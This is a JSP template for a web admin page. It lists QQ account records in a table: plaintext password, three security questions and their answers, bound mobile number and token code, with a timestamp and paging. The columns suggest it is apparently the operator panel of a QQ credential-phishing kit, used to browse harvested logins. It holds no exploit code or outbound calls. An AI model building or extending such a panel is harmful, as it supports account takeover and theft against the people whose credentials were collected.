<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" isELIgnored="false"%>
<%@ include file="/views/common/meta.jsp"%>

<div class="tpl-portlet-components">
	<form class="am-form am-form-horizontal" id="queryForm" role="form" action="<%=basePath %>/qq/list">
	       <div class="am-g tpl-amazeui-form">
            <div class="am-u-lg-6 am-u-end">
                <button class="am-btn am-btn-secondary am-radius" type="button" onclick="loadRight('<%=basePath %>/qq/list','')">返回</button>
            </div>
        </div>
		<input type="hidden" id="page" name="pageNumber" value="${page.pageNumber}">
	</form>
	<div class="tpl-block">
		<div class="am-g">
			<div class="am-u-sm-12 am-scrollable-horizontal">
				<table
					class="am-table am-table-striped am-table-hover table-main am-text-nowrap">
					<thead>
						<tr>
							<th>QQ</th>
							<th>操作时间</th>
							<th>密码</th>
							<th>密保1</th>
							<th>答案1</th>
							<th>密保2</th>
                            <th>答案2</th>
                            <th>密保3</th>
                            <th>答案3</th>
							<th>绑定手机号码</th>
							<th>令牌码</th>
						</tr>
					</thead>
					<tbody>
						<c:forEach items="${page.list}" var="item">
							<tr>
								<td>${item.qq }</td>
								<td><fmt:formatDate value="${item.createTime }" pattern="yyyy-MM-dd HH:mm" /></td>
								<td>${item.pwd }</td>
                                <td>${item.question1 }</td>
								<td>${item.question1Answer }</td>
								<td>${item.question2 }</td>
                                <td>${item.question2Answer }</td>
                                <td>${item.question3 }</td>
                                <td>${item.question3Answer }</td>
                                <td>${item.mobile }</td>
                                <td>${item.token }</td>
							</tr>
						</c:forEach>
					</tbody>
				</table>
				<div class="am-cf">
					<div class="am-fr">
						<!-- 分页使用 -->
						<div id="pageDiv"></div>
						<input type="hidden" id="pages" name="pages"
							value="${page.totalPage}">
					</div>
				</div>
			</div>
		</div>
	</div>
</div>